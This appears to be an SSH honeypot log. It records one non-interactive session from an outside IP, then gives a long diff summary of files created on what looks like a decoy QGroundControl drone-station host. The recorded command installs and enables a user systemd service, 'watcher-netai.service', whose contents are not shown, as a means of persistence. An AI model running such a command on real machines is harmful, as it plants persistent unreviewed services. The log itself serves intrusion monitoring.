+session_start | mode=non_interactive_exec | session_id=1776710585_149.210.235.123_41472_sshshadow
+
+[2026-04-20 18:43:05.000010 UTC] [1776710585_149.210.235.123_41472_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service'
+
+[2026-04-20 18:43:05.000500 UTC] [1776710584_149.210.235.123_41472_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [
+    "home/test/.cache/QGCMapCache300/qgcMapCache.db",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/004509ee069bceda5e0eda5daf1db207023e32da.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/0201342c68f83c2d6d00b7214835e310efe09892.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/02da439b2a20ff47d4ec268c2ecd33bb6ae4e805.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/040d1ff65c9b20a0e6d6bed8e39f330bd1db3b66.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/05f1e7b4f6ea8dad05306a34199397ee5daf8547.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/09d8d3a6e00495a3dcc27d5d7e92593262c29a54.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/0aa0ddaa1b2d4817f6db68c8f091d25e2f60adc2.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/0b32f95484ddeac686fa2c75d46a6a4e821af557.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/0c1cba847190bb1020019908db9a2d20ac0597b7.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/0cf953c1f182c010037a2db97c87aa764db2036b.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/0dcdbcc9da893fb92f683940aab4040f0c79a966.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/0e2ea9c78353e423501d9a90f605f94a472d984f.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/0ee0de93e38d3381f7599e6c9c5423d2e11b5f47.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/0f5de5b785dbb760db464079fe5c3723117c1dee.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/10fdb31a65e9caec90ae266c65cadd13b0336b38.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/11116a483d4535eaf7e861ad3f5b870b9381a78d.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/14d90a35d08a209208163db217a8fd63116bfc18.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/153d147543b307c950e4105f3db3697e9ae7310b.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/16a141153bcb9329e43b062e34b837515578e56e.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/18a02f5c3409c65ccf0b98a0f73cdf088bd83bf3.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/1929bb386bd9718ed0cba666bc6dffb60a77a204.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/198bb13f3b964b01786b6ebb6d6bd2cac144fa31.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/19e7bb444527403965b991b726f2307fb4f8555a.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/1c84bd9878acfe16ef35d58f5ed83acbe08c6e9c.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/1cf5b5a03fc9456762c07d7561523369f9cbc011.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/1ee4233b2ec4f26af2182ea28db004b2d0a2419c.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/1f737e594f51782ab791bba9e3bc8f76e38af476.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/202f7ac41fd36a1f05ffe05d5954e3b9fbf0c73b.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/2080298f50bb9b975bff67d8ffe637f50c718c0e.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/215f74ae7b69d6da89f53eb322a340665517d4f1.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/21d13d76ff04f2ae8dcef2cc62efd946f828cb45.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/224a98be56327a436afb35da43fb0a75b595cf73.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/2283dadfca31fa0cd9189b198f58b220c4a16f30.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/2372312e27ab09f3b7ef2510e526adcdaa4ba6d2.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/23b3030a20acf019c9ad0e4010c3074e0e2ee125.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/2558930c9c03af9304171f1a156f46051415fceb.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/268d552783776ead314c467cbee38808fb1563e8.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/2730a1f922c4f9ab122ef7f9d46705af1cea51f2.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/2779befba8c376fb9df7e19019aa1a9f62a69fd8.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/2abd25ca7bff64f4b8940e3c852f442dd292f5bb.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/2c65e7610e09566e4b208dbfec24748ee4186534.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/2d94a34078b70bbc6506986d33d4fd183ce4746b.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/2ddee3a51f13a402e413ec3147cbbd1c4b1b28f6.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/31133e9349a0e3025350ab22d7e0bebc174eb0af.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/31a5b878cdd8edc6c5376504a90dc0c32930e8c5.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/33282c85358cec0035db5932681653daf02b6654.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/336bb4cb822e323537dcc6dde61ecc0bb8822263.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/369b4856c4fb6cccd6855c377e1c0d63a4d6a47a.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/37f4445e5ca8c418b71d6b21284a766936fcc62c.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/39336e35c49e190d899814e1783150af8c6bda0f.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/3b8f83ae5c7b02d3b312b16dd832bbe167151628.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/3d2d594a7803d62cbe93a526730e11f8cf53dfe4.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/3db33b8b44da192d62e0f79349e09733de7e4bc6.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/3e46af51e14ee0813503411a3922a867319a04cc.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/403a9ee1a939b97f156c72fc773d8f9ca868f3a6.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/419fd41f3b481259d5c6e9a96dd089b1bc276b28.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/420b79af34fccf58b34652cc00dced0bbe21fde4.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/422236300f17765eb4b19a4599c585d68687ea17.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/4225afbd3a86858663c579a8eb805e64e7a2171d.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/426028286dcad56462d97fafa787930ecbdeb82b.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/42f3f483c96a909fb89767b4b5de9148f6d40ac4.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/44d694fde00f21eba4b01ccc0a427aa986114433.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/44e90ac7cb5a8a8fdcc0871ab738fe4765e74b92.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/47b7161e43fb8951d2e5f48c1d2eb85dbff26476.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/485c7494a1cc96b6cb8cdf753f70c9ed9be98bfe.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/4a8452cdf29753caed100ebc968782826cff429a.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/4b8fc86745d9bcfea49128864894d8d82f216ef7.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/4c8c4698d8e348263eadb32dd593a208749fd14e.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/4cd29f268cb94f642a56625075e08377405a959b.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/4cfd9589ef7f7ed1dc3a1c6e4a47a6da331500ce.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/4d37b7e53f1548c4b719f06b31b1305a16ce2f60.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/4e4d3e101a15eb0a51e9e1c93572edce12b4b40e.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/50b83b10ab7df101bb27175c09356ef7b9c8e0bb.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/52e75f1d02bdb37c6fb964bc777ddfb54e7a2483.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/533260bcf96adcd5148217e7710997d267c77ad1.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/533806c7fde3d67ee403ab811c00159d142de44f.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/590add7bfd4d17c210ee4861654e57aa00c980d9.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/5a99423a7c0ba2be24595e1516c4cc445a0a922e.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/635e39cd6cd9380a21910eb118b2e8b768a3a266.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/63818ecb926e4092e58e2aefd73a90e4d8c9e1e0.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/63df941c76ca8d32b7f09a852d36e08e730ed4be.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/64e2a3d77e1e54de3677bac3db2fe51109ab11e5.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/6628d6f3cae5a347336f9b56fe7ebf93e94aeeab.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/670b2d3521d40e84a8a0a351cd69da62f060e6cc.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/688df39f3d3c7aeec277be907797181755e047b3.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/6b1909e9ff5182120ecf8a0ac0932f0e5fcfa3f5.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/6c2b37d5c520a966de2fc55850aa245b657989b5.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/6c48cf799631550172c4feb4efc9f07a6767f4f8.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/6f9c183cb5d30e704c6478ff2dd79e08fa539322.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/7029a7e71b654a08a0f1a84fe54cdaff3bf737dc.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/70a0ac73ada70217b87170378ef06cbbf737aeb0.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/70e0e06040aa179550c7ed4dafe8b98eb0c341a1.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/7417dad36a223cb4729e4c38d0b2a2152f9f792e.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/752420d9fceadc742c01683f4a6a2e76d673f125.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/7665743e9a8f2c6dec9d97aa28497ba2394830f6.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/767c832cb6fe51d63f978b18bad640b707878e80.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/76ecf0bb62d172768acaabb436c04a6bc2561215.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/7b957d2e6fd55169af4ae9af3f153b6278131989.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/7d6aed1b5f0ee5cce011ecaf0b751f745c410504.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/7edfb24cb65684cd2caa7ecbf8e22f5cf662078f.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/7fcb35ee15baccd07f016ef0a00572b3d26789fc.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/82049ed87d51ce45930ba3e8785b9ef2bfd0b370.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/82617052359b9d4d0d71904f30c19bf5aa64c063.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/82e53b18cd09077d49a0ebc4945f7479b4216f28.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/84a143d9deeb3d273f8be1c626de818dbc41232f.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/84da48cb4acda1aaea62a8e5ac2aaf82c8f50638.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/8584fecf8c45ea26b0f06089ed49d26fbd16cce1.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/88c2d7ce020241859c4f8fb577788daab21b7400.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/8a0d280036b44d0d80ef1e1021330357d1aa9c78.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/8bbb37b45dba3ee7fcd2d11da5c56e437a86e7ed.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/8efa392b1c10205d598e45d5fe1b4760d33454cd.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/901b563d99e1db58a8a4bcae8e030ae03e6def52.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/91105f81512093171586d7d2dabbccf9970b5ad1.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/92269a2bd1c3c7c5f8287c319cb64ef74c2cec9f.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/928581463a6adaf0225244c912351d4af6a6d6e5.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/92c1eeaad10b76bc3d304e7f1db193e156f57993.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/9484c26c97880008ea2f6c668e077443f4d7b514.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/96f6ff31e9286cea7cf12323336a61a9cb53b332.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/976076c56c1c64c9c9b96b89e521b565a8374f6d.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/97c9402717985d6e01a112e79022f2864ee3c361.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/97cd5d5906a60db6954560888e0e319ba04c865d.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/98ba3796ae8607c16eccf7ac804ec53eccb90cb6.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/994353002150bb01ef5ff3c47644bdb45b7dd094.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/99dc7304d8ede2d989c15da966a600d86d93980d.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/9c489f0afa849925a9edbb8b14c7380161088d45.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/9cee1887ed9e4eb8ac928c2acd6b00557c86321d.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/a2eeeb58e7fef096cb090c5c369c035f0729ac00.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/a2f61469c41ab28b5f99a08d6732b2c2e7b51fec.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/a3b43ab857e182ece26c9bf0fba949c4deac1e04.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/a4daed49541120db1579fd5d99c47822d0332d6a.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/a593886ae788fa1e604315810f61589b01c2a91c.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/aad5837ffcacaca042fe562a4dc8d2dfd2d61165.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/ac4c6938a3bf06f5421fb31fcdc8f51af7f1500e.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/aeadc291756d63a5c76edd4564a8a6a63d922a15.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/b074924b841930c55f6214d861b1540362f1baa0.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/b0790b716e16c11736fe64922e139413fc03a976.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/b0b79ec687c7220cac61a65d40c29bce4b4b4e5d.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/b0e7689e63cacbaf0b9718184df4af9bf7c3a798.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/b25272c5f38bbded05e0bb4f74e950b2256fbf68.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/b79e5fffcfbfb289d2be8ef95edb25b6e2746047.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/b7e3c8146c3a9d2900d0bba1a33d4f4b504e1994.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/b7f7e6e4439958dea8925fae36258f0f06bda19f.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/b8e2c6ec69fae2c621fb9b2c486b2f7a7397faaa.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/ba6f727e33bd7c62ea005421a3e4973b617facc9.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/bdc7556e7b1037081b0e717c6be2d4abcc938d1d.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/bf320159a85e6b95ad2a3e06309c16a15f783fd5.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/c0d62a5a0eedba7f52609fe40348f1f6b27cd207.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/c3a20668a819b164c8296c14a406a954d0f20f58.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/c53e11a7d37762578f677e842e79362aaf05c10c.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/c5d2306615a1bd7edb4c603189a8dc0fffd68c5a.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/c7574c227a57b58cb99252d9b22411f9e86f6af0.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/c813fad3348e314c34eed249d495f8584bf0389f.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/c8ec4eb6dd880eaebe3df6da7eddce889f2f5ead.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/cabc900b71c202c176bc4edc2564cd5fa97eedf6.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/cb3bde5c1da95c0d1b9032ae39d22a1528665fa7.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/cc16e7c6fcaf9a057778eca51e074741e0bdf8f2.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/cc65211e13fa480659b75020ce684ba14c4d4585.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/cfe9467a046ceb5a97c4934ebd14a4c27c9d6552.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/d11330955205475ef453915b00f99eedf41e02b0.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/d1430eaa14b92ecad0e2cc57873bbecbab107c9e.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/d19ec1b15ebca6c60981a0a8ccbaa6e5739495c7.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/d2085384ee08842ae73da8b647b3140af925899f.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/d23e5a4f0e0a8ab3a0b1b4cae875ec98f9e31c45.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/d546904fd9aa50a6fcfd031a979248259161794f.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/d679a8bb07d4ce79b0f1c027d01cddd4636b96a8.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/d86b3c5f63ac1a92d6fd870675d9dcf9687dea38.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/d8ffa85862282b4e0819821ed4e064498d950a5f.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/da25a134d27561f37075f8023dc33ca9d98f04de.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/da7e7a90a353c8057ca98387ef36218ff29730d0.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/db6b761073ca2cfc7becc41541807ba4677c06cb.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/dc979646419954ca10445a04ce26b911695d9945.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/de7b3538b9b3bece181500956d9667c0c4666573.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/de7d7b9101e005430a2548fe16102cb3b4827ab9.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/dfded0763f77cdccafaac6857034247490c8170c.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/e03b2ed2fc1baafe1f89c1e4c11e21f459e023af.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/e04a67f82789d00f7cab6ce35e9ce296b6b6bd0d.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/e084d56543a7dbf45f7b545b58ac952a226173f2.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/e4250997e731dc059f5553ce5fd23d2f70980ea1.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/e484b1de7bec3ca7518e2459d2353693656c0f54.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/e4d932265c60c7e74f8ce4a7c9a8714524de22db.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/e516f5c47fe926056247ce55391582c902b6b1bb.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/e6303543d7a8e4ceb20bc579d2298129d8211d0a.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/e6c459ec59a05cbc534d7cd5b1715250ddf0b0ee.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/e75c9fabf9658edd9c5aa2edbc794729bf3eea95.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/e7e910284a664024474ba1a3faf5e3c34217205c.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/e967abaa34f59ea1f3888eb7a8689116e101f5e9.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/e97e908505fcef19b32ef18c1ffc82a8efb84d95.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/ea4bba3c3af24b56ac3b549d1f8a863f3cf60b6c.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/ea4dbfc44405606659c95a36006e12c77eac3d91.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/eabc83f8d64b851e8c03aa1241530bdb6128d344.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/eac9caa0a05bd2cda07f33e124e3f16bebd2c8b3.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/ebfc16d3e5e2f0e1abc89d7242eccee5d5b87ed2.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/ec3f3de683d308d708bd8507176f853fc4fba084.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/ec56543a997197d1e92029dd94c0dd6152053c01.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/ed0002c58e608a38adda5651370c3db761c4deef.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/ef54b9f915977457bc3e30e39d03871f5d15b5fd.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/f335175083ed07636ed3e56d2c6d62be3f837f63.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/f377afc528edf556101569483f843924c5d02232.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/f4c74dc438c0a236772942e6d5c1031acca9f1c5.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/f615f8c89914ce5cf22dcff516aae2c78c1010e9.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/f756a7a6a5b20671f032cfd817056e7ef20518f7.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/f88f4784f62378fc292e5b4076ea4b50f6cf5f89.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/f9f8c0641513138562c8dcc0439e077820f67025.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/fa3c4c239d7e1201ae367b627e3d6fdd060296f1.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/fe4774ea981fe7bb436e9a5fcb4c781adb946f20.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/fe94f164b7b68ce787b6b73de80de1d0854c80a1.qmlc",
+    "home/test/.cache/QGroundControl/QGroundControl/qmlcache/ff65ce181a1f76138e999984a7de57d3f2968724.qmlc",
+    "home/test/.cache/fontconfig/3830d5c3ddfd5cd38a049b759396e72e-le64.cache-7",
+    "home/test/.cache/fontconfig/4c599c202bc5c08e2d34565a40eac3b2-le64.cache-7",
+    "home/test/.cache/fontconfig/7ef2298fde41cc6eeb7af42e48b7d293-le64.cache-7",
+    "home/test/.cache/fontconfig/CACHEDIR.TAG",
+    "home/test/.cache/fontconfig/d589a48862398ed80a3d6066f4f56f4c-le64.cache-7",
+    "home/test/.cache/qtshadercache-x86_64-little_endian-lp64/066ae034a1dd005c8093f7b2e9dd56f6a7a6b7c1",
+    "home/test/.cache/qtshadercache-x86_64-little_endian-lp64/06fbe73da93868584c084ecba2e59b298ad1d26a",
+    "home/test/.cache/qtshadercache-x86_64-little_endian-lp64/1b475d34eb663bb89d6095cacb6e2e68f8d9231c",
+    "home/test/.cache/qtshadercache-x86_64-little_endian-lp64/249689ee833ee3f2fb862acf9dd4d09212fc4689",
+    "home/test/.cache/qtshadercache-x86_64-little_endian-lp64/471e2be2a25cebad4c1bd7cc2f9fc57e6e824901",
+    "home/test/.cache/qtshadercache-x86_64-little_endian-lp64/52469dcf39af45917c61f04db1683ec6c4ae848e",
+    "home/test/.cache/qtshadercache-x86_64-little_endian-lp64/55138a2ecf9601d6b4e0bff7e00b9a4a59f867a3",
+    "home/test/.cache/qtshadercache-x86_64-little_endian-lp64/5b323fa2668b9fd6a74818fb6600c6085e29000a",
+    "home/test/.cache/qtshadercache-x86_64-little_endian-lp64/7f955a9974b247081b31c7b44d8d337e0d922f51",
+    "home/test/.cache/qtshadercache-x86_64-little_endian-lp64/8e149527fa5b8ec66a94ed3bc5da12abe817a44a",
+    "home/test/.cache/qtshadercache-x86_64-little_endian-lp64/916302e6ecd78043e999b4057b9ab03bf5470220",
+    "home/test/.cache/qtshadercache-x86_64-little_endian-lp64/a878f80aaa6e895f13cea6de4b6c857c72a9fcdb",
+    "home/test/.cache/qtshadercache-x86_64-little_endian-lp64/bb682d613229a7f517b7314451ddecf0d95791e9",
+    "home/test/.cache/qtshadercache-x86_64-little_endian-lp64/d6ca86f76931267f96667e29302257fc50238f44",
+    "home/test/.cache/qtshadercache-x86_64-little_endian-lp64/eb58198a9ef995958c9e886ad889bbcef0eaf21d",
+    "home/test/.config/QGroundControl/QGroundControl.ini",
+    "home/test/Documents/QGroundControl/Telemetry/2026-03-23 19-57-20.tlog",
+    "var/log/qgc/ffmpeg-stream.log",
+    "var/log/qgc/novnc.log",
+    "var/log/qgc/qgc.stdout",
+    "var/log/qgc/x11vnc.log"
+  ],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 234,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
